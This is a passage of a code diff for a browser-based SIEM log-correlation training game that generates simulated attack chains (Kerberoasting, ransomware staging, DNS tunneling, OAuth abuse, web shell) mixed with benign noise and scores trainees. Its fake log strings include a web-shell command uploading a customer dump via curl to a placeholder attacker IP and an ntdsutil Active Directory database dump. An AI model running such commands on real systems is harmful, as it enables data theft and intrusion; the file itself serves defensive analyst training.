+    phase: "impact", tags: ["windows","ad"], requires: ["dcaccess"], produces: [],
+    build: (R, ctx) => ({
+      events: [{ time: ctx.clock.now(), source: "EDR", stage: "impact",
+        msg: `Process: ntdsutil.exe "ac i ntds" "ifm" on ${ctx.dc || "DC-02"}, user=${ctx.crackedSvc || "svc_backup"}`, malicious: true }],
+      note: { stage: "impact", description: `ntdsutil IFM dump — the entire AD database is extracted.` }
+    })
+  },
+
+  encryptedExfil: {
+    phase: "exfil", tags: ["network"], requires: ["foothold"], produces: [],
+    build: (R, ctx) => {
+      const mb = R.int(6, 240);
+      const host = ctx.runner || ctx.id.host;
+      return { events: [{ time: ctx.clock.now(), source: "FIREWALL", stage: "exfil",
+        msg: `ALLOW tcp ${host} \u2192 ${ctx.evilIp}:443, ${mb}MB outbound (encrypted)`, malicious: true }],
+        note: { stage: "exfil", description: `Large encrypted outbound transfer to the hostile IP.` } };
+    }
+  },
+
+  dbDump: {
+    phase: "exfil", tags: ["web","db"], requires: ["dbcreds"], produces: [],
+    build: (R, ctx) => {
+      const shell = ctx.shell || "invoice.php";
+      const rows = R.int(12000, 240000);
+      return { events: [
+        { time: ctx.clock.now(), source: "DATABASE", stage: "exfil",
+          msg: `Query: SELECT * FROM customers from web-srv user=portal_app (${rows.toLocaleString()} rows)`, malicious: true },
+        { time: ctx.clock.advance(35), source: "WEB", stage: "exfil",
+          msg: `GET /portal/upload/${shell}?cmd=curl+-T+/tmp/dump.csv+ftp://${ctx.evilIp}/ from ${ctx.evilIp}, 200 OK`, malicious: true }
+      ], note: { stage: "exfil", description: `Bulk customer table dumped and pushed out over FTP.` } };
+    }
+  },
+
+  vaultTheft: {
+    phase: "exfil", tags: ["ci","secrets"], requires: ["cikey"], produces: [],
+    build: (R, ctx) => ({
+      events: [{ time: ctx.clock.now(), source: "VAULT", stage: "exfil",
+        msg: `Read secret ${ctx.runner || "runner-04"}: AWS_DEPLOY_KEY (svc_ci access)`, malicious: true }],
+      note: { stage: "exfil", description: `Cloud deploy key stolen from the secrets vault using the CI service account.` }
+    })
+  },
+
+  usbCloudExfil: {
+    phase: "exfil", tags: ["insider"], requires: ["foothold"], produces: [],
+    build: (R, ctx) => {
+      const vendor = R.pick(POOL.usbVendors);
+      const cap = R.pick(["64GB","128GB","256GB","1TB"]);
+      const gb = (R.int(20, 90) / 10).toFixed(1);
+      const cloud = R.pick(POOL.cloudUploads);
+      return { events: [
+        { time: ctx.clock.now(), source: "FILESERVER", stage: "recon",
+          msg: `Bulk read user=${ctx.id.user} \\\\fs01\\engineering\\source\\ (${R.int(900,4000)} files, ${(gb*1.1).toFixed(1)}GB)`, malicious: true },
+        { time: ctx.clock.advance(120), source: "DLP", stage: "recon",
+          msg: `Sensitivity label "CONFIDENTIAL - Source Code" detected in copy by ${ctx.id.user}`, malicious: true },
+        { time: ctx.clock.advance(180), source: "USB", stage: "exfil",
+          msg: `Mass-storage device connected to ${ctx.id.laptop}, vendor=${vendor}, capacity=${cap}`, malicious: true },
+        { time: ctx.clock.advance(200), source: "EDR", stage: "exfil",
+          msg: `File copy: ${gb}GB written to E:\\ on ${ctx.id.laptop}`, malicious: true },
+        { time: ctx.clock.advance(300), source: "PROXY", stage: "exfil",
+          msg: `POST https://${cloud}/ user=${ctx.id.user} (allowed, ${gb}GB)`, malicious: true }
+      ], note: { stage: "exfil", description: `Confidential data copied to USB and uploaded to cloud — two parallel exfil channels.` } };
+    }
+  },
+
+  graphAbuse: {
+    phase: "exfil", tags: ["m365","oauth"], requires: ["oauthtoken"], produces: [],
+    build: (R, ctx) => {
+      const app = ctx.app || "Mailbox Optimizer";
+      return { events: [
+        { time: ctx.clock.now(), source: "GRAPH-API", stage: "recon",
+          msg: `App "${app}" enumerated ${R.int(2000,12000)} messages in mailbox ${ctx.id.user} via Mail.Read`, malicious: true },
+        { time: ctx.clock.advance(180), source: "GRAPH-API", stage: "recon",
+          msg: `App "${app}" listed OneDrive contents user=${ctx.id.user}, ${R.int(200,2000)} files indexed`, malicious: true },
+        { time: ctx.clock.advance(400), source: "GRAPH-API", stage: "impact",
+          msg: `App "${app}" sent ${R.int(20,80)} emails as ${ctx.id.user} to external recipients via Mail.Send`, malicious: true }
+      ], note: { stage: "exfil", description: `OAuth app uses Graph API to read mail, list files, and send phishing onward — no password needed.` } };
+    }
+  },
+
+  becWire: {
+    phase: "impact", tags: ["m365"], requires: ["foothold"], produces: [],
+    build: (R, ctx) => ({
+      events: [{ time: ctx.clock.now(), source: "EXO-MAILBOX", stage: "impact",
+        msg: `Outbound email user=${ctx.id.user} subject:"UPDATED wire instructions" to billing@${R.pick(POOL.evilDomains)}`, malicious: true }],
+      note: { stage: "impact", description: `Fraudulent wire-instruction email sent from the hijacked mailbox.` }
+    })
+  },
+
+  dnsTunnel: {
+    phase: "exfil", tags: ["network","dns"], produces: ["foothold"],
+    build: (R, ctx) => {
+      const dom = R.pick(POOL.evilDomains);
+      const fakeb64 = () => R.shuffle("aGVsbG8td29ybGQ4OTl4Y3p0".split("")).join("").slice(0, R.int(16, 22));
+      const n = R.int(4, 6);
+      const ev = [];
+      for (let i = 0; i < n; i++) {
+        ev.push({ time: i === 0 ? ctx.clock.now() : ctx.clock.advance(6), source: "DNS", stage: "exfil",
+          msg: `Query TXT: ${fakeb64()}.exfil.${dom} from ${ctx.internalIp}`, malicious: true });
+      }
+      return { events: ev,
+        note: { stage: "exfil", description: `Rapid TXT queries to one suspicious domain, each carrying encoded data — covert exfil over DNS.` } };
+    }
+  }
+};
+
+// ============================================================
+// FIXED TEMPLATES  (faithful reconstructions of the original 10)
+// Each lists stage keys in order, plus metadata + explanation.
+// ============================================================
+const TEMPLATES = {
+  credexfil: {
+    name: "Credential Compromise & Data Theft", minDiff: 1, composed: false,
+    stages: ["torLogin", "encodedPs", "encryptedExfil"],
+    brief: (ctx) => `Off-hours authentication anomalies were flagged for ${ctx.id.userFull} (${ctx.id.user}). Determine which events form the attack chain.`,
+    explain: (ctx) => `A textbook <strong>credential compromise</strong>: brute force from <code>${ctx.evilIp}</code>, then encoded PowerShell, then a large encrypted transfer back to the same IP. <em>One source IP ties authentication, execution, and egress together.</em>`
+  },
+  mfabec: {
+    name: "MFA Fatigue & Mailbox Hijack", minDiff: 2, composed: false,
+    stages: ["mfaFatigue", "inboxRule", "becWire"],
+    brief: (ctx) => `A burst of MFA prompts hit ${ctx.id.user} late at night. Identify the events that constitute the intrusion.`,
+    explain: (ctx) => `<strong>MFA fatigue</strong> into <strong>business email compromise</strong>: push spam until the user approves, a hidden inbox rule to conceal replies, then a fraudulent wire email. The approve-after-many-denies from one unknown ASN is the giveaway.`
+  },
+  insider: {
+    name: "Insider Data Theft", minDiff: 2, composed: false,
+    stages: ["usbCloudExfil"],
+    brief: (ctx) => `HR flagged that ${ctx.id.userFull} resigned this morning. Review the day's logs for data exfiltration in progress.`,
+    explain: (ctx) => `<strong>Insider threat</strong>: a bulk read of confidential source triggers DLP, then the data leaves by <em>two parallel channels</em> — a USB mass-storage device and a cloud upload — redundancy in case one is blocked.`
+  },
+  ransomware: {
+    name: "Ransomware Pre-Encryption Staging", minDiff: 2, composed: false,
+    stages: ["macroExec", "c2beacon", "adRecon", "lateralDC", "shadowDelete"],
+    brief: (ctx) => `An endpoint in ${ctx.id.dept} showed an unusual process tree on a quiet night. Trace the chain to its objective.`,
+    explain: (ctx) => `Classic <strong>ransomware staging</strong>: <code>winword.exe \u2192 rundll32.exe</code> macro execution, a C2 beacon to <code>${ctx.evilIp}</code>, AD recon, lateral movement to the DC, then the smoking gun — <em>shadow copy and backup catalog deletion</em> right before encryption.`
+  },
+  supplychain: {
+    name: "CI Supply-Chain Compromise", minDiff: 3, composed: false,
+    stages: ["npmCompromise", "c2beacon", "vaultTheft"],
+    brief: (ctx) => `A developer pushed a routine dependency update. The build went green — then the EDR fired. Trace the chain.`,
+    explain: (ctx) => `A <strong>compromised npm package</strong>: a malicious transitive dependency runs hidden PowerShell during <code>npm install</code>, beacons to <code>${ctx.evilIp}</code>, and steals the cloud deploy key from the vault. <em>Build pipelines need the same EDR coverage as user endpoints.</em>`
+  },
+  dnsexfil: {
+    name: "DNS Tunneling Exfiltration", minDiff: 3, composed: false,
+    stages: ["dnsTunnel"],
+    brief: (ctx) => `DNS volume is up this week and most of it looks normal. Somewhere in the noise, data is leaving. Find it.`,
+    explain: (ctx) => `<strong>DNS tunneling</strong>: data base64-encoded into subdomain labels of TXT queries to an attacker domain. Tells: high frequency, high-entropy labels, one odd domain repeated from a single host (<code>${ctx.internalIp}</code>).`
+  },
+  kerberoast: {
+    name: "Kerberoasting to Domain Dominance", minDiff: 3, composed: false,
+    stages: ["kerberoast", "lateralDC", "ntdsDump"],
+    brief: (ctx) => `A Kerberoasting detection rule lit up today. Reconstruct what the attacker did with what they got.`,
+    explain: (ctx) => `<strong>Kerberoasting</strong>: a burst of RC4 (<code>enc=0x17</code>) TGS requests for service accounts, crackable offline. The cracked service account then logs into a DC, and <code>ntdsutil ... ifm</code> dumps the entire AD database.`
+  },
+  webshell: {
+    name: "Web Shell to Database Exfiltration", minDiff: 2, composed: false,
+    stages: ["webShell", "shellCmds", "dbDump"],
+    brief: (ctx) => `A public-facing web server is behaving oddly. Reconstruct what the attacker did after the initial foothold.`,
+    explain: (ctx) => `A <strong>web shell to data breach</strong>: a script is uploaded (the <code>?cmd=</code> parameter is the tell), credentials are read from a config file, then the customer table is dumped and exfiltrated. Every malicious request shares one source IP (<code>${ctx.evilIp}</code>) and shell path.`
+  },
+  lolbin: {
+    name: "Living Off the Land", minDiff: 3, composed: false,
+    stages: ["lolbinDownload", "dualPersist", "c2beacon"],
+    brief: (ctx) => `EDR didn't fire — no malware on disk — but ${ctx.id.host} feels off. Look for an attacker using only built-in binaries.`,
+    explain: (ctx) => `<strong>Living-off-the-land binaries</strong>: <code>certutil</code> abused as a downloader, <code>rundll32</code> executes the payload, then <em>dual persistence</em> (scheduled task + Run key) and a low-volume beacon. Detection comes from process lineage and command-line args, not file hashes.`
+  },
+  oauth: {
+    name: "Illicit OAuth Consent Grant", minDiff: 2, composed: false,
+    stages: ["phishConsent", "graphAbuse"],
+    brief: (ctx) => `A new OAuth application appeared in the tenant overnight and no one in IT recognizes it. Reconstruct what happened.`,
+    explain: (ctx) => `<strong>Illicit consent grant</strong> (OAuth phishing): rather than steal a password, the attacker tricks the user into granting an app <code>Mail.Read/Send</code> and <code>offline_access</code>. The app then uses Graph API to read mail, list files, and send phishing onward — <em>MFA and password resets don't help</em>.`
+  }
+};
+
+// ============================================================
+// COMPOSER
+// Builds a NOVEL chain by selecting stages under constraints:
+//  - must start with an access/execution stage that yields a foothold
+//  - each added stage's `requires` must be satisfied by something
+//    already produced (causal validity)
+//  - stages are ordered by phase (access -> ... -> exfil/impact)
+//  - must end on an exfil or impact stage (an objective)
+//  - shares one identity + hostile IP throughout (entity continuity)
+// Difficulty controls chain length.
+// ============================================================
+function composeChain(R, ctx, difficulty) {
+  const allKeys = Object.keys(STAGES);
+  const targetLen = { 1: 3, 2: 4, 3: 5 }[difficulty] || 4;
+
+  // How many stages we allow to share a single phase. A realistic
+  // intrusion has at most one or two of any phase — not five exfils.
+  const PHASE_CAP = { access: 1, execution: 2, c2: 1, recon: 1,
+                      credaccess: 1, persistence: 2, lateral: 1,
+                      exfil: 1, impact: 1 };
+
+  const chosen = [];
+  const produced = new Set();
+  const phaseCounts = {};
+
+  function addStage(k) {
+    chosen.push(k);
+    (STAGES[k].produces || []).forEach(p => produced.add(p));
+    const ph = STAGES[k].phase;
+    phaseCounts[ph] = (phaseCounts[ph] || 0) + 1;
+  }
+
+  // 1. Opener: an ACCESS or EXECUTION stage that needs nothing and
+  //    yields a foothold. Exfil/impact stages can never open a chain —
+  //    that was the source of the incoherent "exfil-first" cases.
+  const openers = allKeys.filter(k => {
+    const s = STAGES[k];
+    return (!s.requires || s.requires.length === 0) &&
+           (s.produces || []).includes("foothold") &&
+           (s.phase === "access" || s.phase === "execution");
+  });
+  // Prefer a true initial-access opener when one is available (70%),
+  // so chains usually start where a real intrusion does.
+  const accessOpeners = openers.filter(k => STAGES[k].phase === "access");
+  const openerPool = accessOpeners.length && R.chance(0.7) ? accessOpeners : openers;
+  addStage(R.pick(openerPool));
+
+  // 2. Grow the chain. A candidate is addable if: not already used,
+  //    its requires are satisfied, its phase is >= the last phase
+  //    (monotonic), and we haven't hit the per-phase cap.
+  function canAdd(k) {
+    if (chosen.includes(k)) return false;
+    const s = STAGES[k];
+    if ((s.requires || []).some(r => !produced.has(r))) return false;
+    const lastPhase = PHASE_ORDER[STAGES[chosen[chosen.length - 1]].phase];
+    if (PHASE_ORDER[s.phase] < lastPhase) return false;
+    if ((phaseCounts[s.phase] || 0) >= (PHASE_CAP[s.phase] || 1)) return false;
+    return true;
+  }
+
+  let guard = 0;
+  while (chosen.length < targetLen && guard++ < 50) {
+    const candidates = allKeys.filter(canAdd);
+    if (!candidates.length) break;
+    // Bias toward stages that ADVANCE the phase so the chain keeps
+    // moving toward an objective rather than stalling in one phase.
+    const lastPhase = PHASE_ORDER[STAGES[chosen[chosen.length - 1]].phase];
+    const advancing = candidates.filter(k => PHASE_ORDER[STAGES[k].phase] > lastPhase);
+    const pickFrom = advancing.length && R.chance(0.75) ? advancing : candidates;
+    addStage(R.pick(pickFrom));
+  }
+
+  // 3. Guarantee an objective ending (exfil/impact). If the chain
+  //    didn't reach one, append a compatible objective whose
+  //    prerequisites are already satisfied.
+  const lastPhaseName = STAGES[chosen[chosen.length - 1]].phase;
+  if (lastPhaseName !== "exfil" && lastPhaseName !== "impact") {
+    const objectives = allKeys.filter(k => {
+      const s = STAGES[k];
+      return (s.phase === "exfil" || s.phase === "impact") &&
+             !chosen.includes(k) &&
+             (s.requires || []).every(r => produced.has(r));
+    });
+    if (objectives.length) addStage(R.pick(objectives));
+  }
+
+  return chosen;
+}
+
+// ============================================================
+// ASSEMBLER  (shared by fixed + composed)
+// ============================================================
+function noiseEvents(R, ctx, count) {
+  const out = [];
+  const benignUsers = R.sample(POOL.firstNames, 6).map(f => `${f[0]}.${R.pick(POOL.lastNames)}`);
+  const benignHost = () => `${R.pick(POOL.hostPrefixes)}-${R.pick(POOL.depts)}-${String(R.int(1,48)).padStart(2,"0")}`;
+  const benignDom = () => R.pick(POOL.benignDomains);
+  const intIp = () => buildInternalIp(R);
+  const generators = [
+    () => ({ source: "O365-AUTH", msg: `SUCCESS login user=${R.pick(benignUsers)} src=${intIp()} (corporate VPN)` }),
+    () => ({ source: "O365-AUTH", msg: `FAIL login user=${R.pick(benignUsers)} src=${intIp()} (mistyped password, 1 attempt)` }),
+    () => ({ source: "EDR", msg: `PowerShell signed script run by IT-ADMIN on ${benignHost()} (Get-MailboxStatistics)` }),
+    () => ({ source: "FIREWALL", msg: `ALLOW tcp ${benignHost()} \u2192 ${benignDom()}:443, ${R.int(2,90)}MB (software update)` }),
+    () => ({ source: "DNS", msg: `Query A: ${benignDom()} from ${intIp()}` }),
+    () => ({ source: "DNS", msg: `Query AAAA: ${benignDom()} from ${intIp()}` }),
+    () => ({ source: "DHCP", msg: `OFFER 10.${R.int(0,40)}.${R.int(0,250)}.${R.int(2,254)} to ${benignHost()}` }),
+    () => ({ source: "WEB", msg: `GET /portal/dashboard from ${intIp()} user=${R.pick(benignUsers)}, 200 OK` }),
+    () => ({ source: "WEB", msg: `POST /portal/api/login from ${intIp()}, 200 OK` }),
+    () => ({ source: "BACKUP", msg: `Veeam job "Nightly-Full" completed on ${R.pick(POOL.servers)}, ${R.int(40,900)}GB` }),
+    () => ({ source: "EDR", msg: `node.exe ran npm install on ${benignHost()} (CI runner, ${R.int(20,300)} packages)` }),
+    () => ({ source: "WINDOWS", msg: `Event 4624 logon type 2 (interactive) user=${R.pick(benignUsers)} on ${benignHost()}` }),
+    () => ({ source: "EXO-MAILBOX", msg: `Inbox rule created user=${R.pick(benignUsers)}: move newsletters to "Reading" folder` }),
+    () => ({ source: "AAD-MFA", msg: `MFA push APPROVE user=${R.pick(benignUsers)} src=${intIp()} (1st prompt)` }),
+    () => ({ source: "FILESERVER", msg: `Bulk read user=${R.pick(benignUsers)} \\\\fs01\\shared\\reports (${R.int(50,2000)} files, scheduled sync)` }),
+    () => ({ source: "VAULT", msg: `Read secret ${R.pick(POOL.svcAccounts)}: DB_CONN (scheduled rotation)` }),
+    () => ({ source: "PROXY", msg: `GET ${benignDom()} from ${benignHost()} (allowed, category: business)` }),
+    () => ({ source: "DATABASE", msg: `Query: SELECT count(*) FROM orders user=portal_app (${R.int(1,40)} rows)` }),
+    () => ({ source: "WINDOWS-DC", msg: `Event 4769 TGS request user=${R.pick(benignUsers)} service=HOST/web01 enc=0x12 (AES)` }),
+    () => ({ source: "AAD-CONSENT", msg: `OAuth consent GRANTED user=${R.pick(benignUsers)} \u2192 app "Salesforce" (publisher verified)` })
+  ];
+  for (let i = 0; i < count; i++) {
+    const g = R.pick(generators)();
+    out.push({ time: null, source: g.source, msg: g.msg, stage: null, malicious: false });
+  }
+  return out;
+}
+
+function scatterNoiseTimes(R, noise, minSec, maxSec) {
+  const span = Math.max(60, maxSec - minSec);
+  const margin = Math.max(900, span);
+  noise.forEach(ev => {
+    let total;
+    if (R.chance(0.7)) total = R.int(minSec, maxSec);
+    else total = R.chance(0.5) ? R.int(Math.max(0, minSec - margin), minSec) : R.int(maxSec, maxSec + margin);
+    const h = Math.floor(total / 3600) % 24, m = Math.floor((total % 3600) / 60), s = total % 60;
+    ev.time = [h, m, s].map(n => String(n).padStart(2, "0")).join(":");
+  });
+}
+
+function runStages(R, ctx, stageKeys) {
+  const events = [];
+  const chain = [];
+  stageKeys.forEach(k => {
+    const out = STAGES[k].build(R, ctx);
+    out.events.forEach(e => events.push(e));
+    chain.push(out.note);
+  });
+  return { events, chain };
+}
+
+function generateCase(seed, mode, difficulty) {
+  // mode: a fixed template key, or "compose:<n>" / "any"
+  const R = rngTools(makeRng(seed));
+  const ctx = {
+    id: buildIdentity(R),
+    evilIp: buildEvilIp(R),
+    internalIp: buildInternalIp(R),
+    clock: makeClock(R),
+    difficulty
+  };
+
+  let stageKeys, title, brief, explain, composed = false;
+
+  if (mode && mode.startsWith("compose")) {
+    composed = true;
+    stageKeys = composeChain(R, ctx, difficulty);
+    title = "Composed Incident";
+    brief = `An alert correlation rule grouped these events. Reconstruct the attack chain — or determine there isn't one. (Procedurally composed; the chain is novel.)`;
+    explain = null; // generated below from the chain notes
+  } else {
+    const tpl = TEMPLATES[mode];
+    stageKeys = tpl.stages;
+    title = tpl.name;
+    brief = tpl.brief(ctx);
+    explain = tpl.explain(ctx);
+  }
+
+  const built = runStages(R, ctx, stageKeys);
+  const signal = built.events;
+  const sigSecs = signal.map(e => tToSeconds(e.time));
+  const minSec = Math.min(...sigSecs), maxSec = Math.max(...sigSecs);
+
+  const noiseByDiff = { 1: [6, 9], 2: [12, 16], 3: [20, 28] };
+  const [nMin, nMax] = noiseByDiff[difficulty] || noiseByDiff[2];
+  const noise = noiseEvents(R, ctx, R.int(nMin, nMax));
+  scatterNoiseTimes(R, noise, minSec, maxSec);
+
+  const events = signal.concat(noise).sort((a, b) => tToSeconds(a.time) - tToSeconds(b.time));
+  const maliciousIdx = [];
+  events.forEach((e, i) => { if (e.malicious) maliciousIdx.push(i); });
+
+  // For composed cases, synthesize an explanation from the chain notes
+  // and the actual entities used, so the analyst notes always match.
+  if (composed) {
+    const phases = built.chain.map(c => STAGE_LABELS[c.stage] || c.stage);
+    explain = `This is a <strong>procedurally composed</strong> chain spanning ${built.chain.length} stages: ${phases.join(" \u2192 ")}. ` +
+      `The thread tying it together is a single actor against ${ctx.id.user} / ${ctx.id.host}, with hostile infrastructure at <code>${ctx.evilIp}</code>. ` +
+      `Each step below was selected so its prerequisites were established by an earlier step — read it as one continuous intrusion, and treat the surrounding routine telemetry as noise.`;
+    title = `Composed Incident: ${phases[0]} \u2192 ${phases[phases.length - 1]}`;
+  }
+
+  return {
+    seed, mode, difficulty, composed,
+    title, briefing: brief, events, maliciousIdx,
+    killChain: built.chain, explanation: explain
+  };
+}
+
+function templatesForDifficulty(diff) {
+  return Object.keys(TEMPLATES).filter(k => TEMPLATES[k].minDiff <= diff);
+}
+
+
+// ============================================================
+// APP STATE + PERSISTENCE
+// ============================================================
+const STORAGE_KEY = "siem-correlation-generator-v1";
+const state = {
+  seed: null,
+  attackKey: null,     // null = "any"
+  difficulty: 2,
+  current: null,       // generated case
+  selections: new Set(),
+  submitted: false,
+  result: null,
+  stats: { attempts: 0, best: null }
+};
+
+function loadStats() {
+  try {
+    const saved = JSON.parse(localStorage.getItem(STORAGE_KEY));
+    if (saved && saved.stats) state.stats = saved.stats;
+  } catch (e) { /* ignore */ }
+}
+function saveStats() {
+  try {
+    localStorage.setItem(STORAGE_KEY, JSON.stringify({ stats: state.stats }));
+  } catch (e) { /* ignore */ }
+}
+
+function randomSeed() {
+  return Math.floor(Math.random() * 0xFFFFFFFF) >>> 0;
+}
+
+// ============================================================
+// CASE LIFECYCLE
+// ============================================================
+function newCase(opts) {
+  opts = opts || {};
+  const diff = opts.difficulty != null ? opts.difficulty : state.difficulty;
+  let key = opts.attackKey !== undefined ? opts.attackKey : state.attackKey;
+
+  const seed = opts.seed != null ? opts.seed : randomSeed();
+
+  // Resolve the mode to pass to the engine:
+  //   "compose"      -> procedural composition
+  //   null / "any"   -> a random FIXED template, chosen reproducibly from the seed
+  //   <template key> -> that fixed template
+  let mode;
+  if (key === "compose") {
+    mode = "compose";
+  } else if (!key) {
+    const valid = templatesForDifficulty(diff);
+    const pickRng = makeRng(seed ^ 0x9E3779B9);
+    mode = valid[Math.floor(pickRng() * valid.length)];
+  } else {
+    mode = key;
+    if (TEMPLATES[key] && TEMPLATES[key].minDiff > diff) {
+      // chosen attack isn't available at this difficulty: bump up to its minimum
+      state.difficulty = TEMPLATES[key].minDiff;
+    }
+  }
+
+  state.seed = seed;
+  state.current = generateCase(seed, mode, state.difficulty);
+  state.selections = new Set();
+  state.submitted = false;
+  state.result = null;
+
+  syncControls();
+  renderScenario();
+  updateUrl();
+}
+
+function regenerateFromControls() {
+  // Load the seed currently in the input, honoring attack + difficulty selects
+  const raw = document.getElementById("seedInput").value.trim();
+  let seed = parseInt(raw, 10);
+  if (!Number.isFinite(seed)) seed = randomSeed();
+  seed = seed >>> 0;
+
+  const diff = parseInt(document.getElementById("difficultySelect").value, 10);
+  const sel = document.getElementById("attackSelect").value;
+  const key = sel === "any" ? null : sel;  // "compose" and template keys pass through
+
+  state.difficulty = diff;
+  state.attackKey = key;
+  newCase({ seed, difficulty: diff, attackKey: key });
+}
+
+// ============================================================
+// RENDER
+// ============================================================
+function escapeHTML(str) {
+  return String(str)
+    .replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;")
+    .replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+}
+
+function syncControls() {
+  document.getElementById("seedInput").value = state.seed;
+  document.getElementById("difficultySelect").value = state.difficulty;
+  document.getElementById("attackSelect").value = state.attackKey || "any";
+}
+
+function renderAttackOptions() {
+  const sel = document.getElementById("attackSelect");
+  sel.innerHTML = "";
+  const any = document.createElement("option");
+  any.value = "any"; any.textContent = "Any fixed scenario (random)";
+  sel.appendChild(any);
+
+  // Procedural composition — the novel, combinatorial mode.
+  const comp = document.createElement("option");
+  comp.value = "compose"; comp.textContent = "Composed (procedural)";
+  sel.appendChild(comp);
+
+  const sep = document.createElement("option");
+  sep.disabled = true; sep.textContent = "\u2500\u2500 fixed scenarios \u2500\u2500";
+  sel.appendChild(sep);
+
+  Object.keys(TEMPLATES).forEach(k => {
+    const o = document.createElement("option");
+    o.value = k;
+    o.textContent = TEMPLATES[k].name;
+    sel.appendChild(o);
+  });
+}
+
+function renderScenario() {
+  const sc = state.current;
+  const panel = document.getElementById("scenarioPanel");
+  const isSubmitted = state.submitted;
+  const sels = state.selections;
+  const diffLabel = ["", "Beginner", "Intermediate", "Advanced"][sc.difficulty];
+
+  let html = `
+    <div class="scenario-header">
+      <h2 class="scenario-title">${escapeHTML(sc.title)}</h2>
+      <div class="scenario-meta">
+        <span class="meta-chip diff-${sc.difficulty}">${diffLabel}</span>
+        ${sc.composed ? `<span class="meta-chip composed">composed</span>` : ""}
+        <span class="meta-chip">${sc.events.length} events</span>
+        <span class="meta-chip seed">seed ${sc.seed}</span>
+      </div>
+    </div>
+    <p class="briefing">${escapeHTML(sc.briefing)}</p>
+    <div class="console" role="list" aria-label="Log events — click each event you believe is part of the attack chain">
+  `;
+
+  sc.events.forEach((ev, i) => {
+    const selected = sels.has(i);
+    const malicious = !!ev.malicious;
+    let cls = "log-row";
+    let marker = "";
+    if (selected) cls += " selected";
+    if (isSubmitted) {
+      cls += " submitted";
+      if (selected && malicious) { cls += " revealed-correct"; marker = "\u2713"; }
+      else if (selected && !malicious) { cls += " revealed-incorrect"; marker = "\u2717"; }
+      else if (!selected && malicious) { cls += " revealed-missed"; marker = "!"; }
+    }
+    html += `
+      <div class="${cls}" role="listitem" tabindex="0" data-event-idx="${i}" aria-pressed="${selected}">
+        ${isSubmitted ? `<span class="marker" aria-hidden="true">${marker}</span>` : ""}
+        <span class="time">${ev.time}</span>
+        <span class="source">[${escapeHTML(ev.source)}]</span>
+        <span class="msg">${escapeHTML(ev.msg)}</span>
+      </div>
+    `;
+  });
+  html += `</div>`;
+
+  // controls under console
+  html += `
+    <div class="controls">
+      <div class="selection-count">
+        Selected: <strong id="selectionCount">${sels.size}</strong> of ${sc.events.length}
+      </div>
+      <div class="spacer"></div>
+      ${isSubmitted ? `
+        <button type="button" class="btn btn-secondary" id="retryBtn">Try again (same case)</button>
+      ` : `
+        <button type="button" class="btn btn-secondary" id="resetBtn">Clear</button>
+        <button type="button" class="btn btn-primary" id="submitBtn"${sels.size === 0 ? " disabled" : ""}>Check my correlation</button>
+      `}
+    </div>
+  `;
+
+  if (!isSubmitted) {
+    html += `<p class="hint-line">Tip: some routine events deliberately resemble the attack. Reason about context, not keywords.</p>`;
+  }
+
+  if (isSubmitted) {
+    const r = state.result;
+    let scoreClass = "score-poor", headline = "";
+    if (r.correct === r.totalMalicious && r.wrong === 0) {
+      scoreClass = "score-perfect"; headline = "Excellent correlation.";
+    } else if (r.correct >= r.totalMalicious && r.wrong <= 1) {
+      scoreClass = "score-good"; headline = "Good correlation \u2014 minor over-flagging.";
+    } else if (r.correct >= Math.ceil(r.totalMalicious / 2)) {
+      scoreClass = "score-partial"; headline = "Partial credit \u2014 review what you missed.";
+    } else {
+      scoreClass = "score-poor"; headline = "Review the chain \u2014 most of the attack went unflagged.";
+    }
+    html += `
+      <div class="feedback ${scoreClass}" role="status">
+        <h4>${headline}</h4>
+        <div class="score-line">
+          <strong>${r.correct}</strong> of <strong>${r.totalMalicious}</strong> malicious events flagged
+          &nbsp;\u00b7&nbsp; <strong>${r.wrong}</strong> false positives
+          &nbsp;\u00b7&nbsp; Score: <strong>${r.score}</strong> / ${r.totalMalicious * 10}
+        </div>
+        <p class="explanation">${sc.explanation}</p>
+        <div class="kill-chain">
+          <h5>Reconstructed attack chain</h5>
+          <ol>
+            ${sc.killChain.map(k => `<li><span class="stage">${escapeHTML(STAGE_LABELS[k.stage] || k.stage)}</span>${escapeHTML(k.description)}</li>`).join("")}
+          </ol>
+        </div>
+      </div>
+    `;
+  }
+
+  panel.innerHTML = html;
+
+  // bind row toggles
+  panel.querySelectorAll(".log-row").forEach(row => {
+    if (isSubmitted) return;
+    const idx = parseInt(row.dataset.eventIdx, 10);
+    row.addEventListener("click", () => toggleEvent(idx));
+    row.addEventListener("keydown", (e) => {
+      if (e.key === " " || e.key === "Enter") { e.preventDefault(); toggleEvent(idx); }
+    });
+  });
+
+  const submitBtn = document.getElementById("submitBtn");
+  if (submitBtn) submitBtn.addEventListener("click", submitCase);
+  const resetBtn = document.getElementById("resetBtn");
+  if (resetBtn) resetBtn.addEventListener("click", clearSelections);
+  const retryBtn = document.getElementById("retryBtn");
+  if (retryBtn) retryBtn.addEventListener("click", retrySameCase);
+
+  updateHeader();
+}
+
+function updateHeader() {
+  document.getElementById("attemptCount").textContent = state.stats.attempts;
+  document.getElementById("bestScore").textContent =
+    state.stats.best == null ? "\u2014" : state.stats.best + "%";
+}
+
+// ============================================================
+// INTERACTION
+// ============================================================
+function toggleEvent(idx) {
+  if (state.submitted) return;
+  if (state.selections.has(idx)) state.selections.delete(idx);
+  else state.selections.add(idx);
+  renderScenario();
+}
+
+function clearSelections() {
+  state.selections = new Set();
+  renderScenario();
+}
+
+function submitCase() {
+  const sc = state.current;
+  let correct = 0, wrong = 0;
+  const totalMalicious = sc.maliciousIdx.length;
+  sc.events.forEach((ev, i) => {
+    const selected = state.selections.has(i);
+    if (selected && ev.malicious) correct++;
+    else if (selected && !ev.malicious) wrong++;
+  });
+  const score = Math.max(0, correct * 10 - wrong * 5);
+  const pct = Math.round((score / (totalMalicious * 10)) * 100);
+
+  state.submitted = true;
+  state.result = { correct, wrong, totalMalicious, score };
+
+  state.stats.attempts++;
+  if (state.stats.best == null || pct > state.stats.best) state.stats.best = pct;
+  saveStats();
+
+  renderScenario();
+  document.getElementById("scenarioPanel").scrollIntoView({ behavior: "smooth", block: "nearest" });
+}
+
+function retrySameCase() {
+  state.selections = new Set();
+  state.submitted = false;
+  state.result = null;
+  renderScenario();
+}
+
+// ============================================================
+// URL SYNC  —  ?seed=..&a=..&d=..  for sharing exact cases
+// ============================================================
+function updateUrl() {
+  try {
+    const p = new URLSearchParams();
+    p.set("seed", state.seed);
+    p.set("d", state.difficulty);
+    if (state.attackKey) p.set("a", state.attackKey);
+    const url = location.pathname + "?" + p.toString();
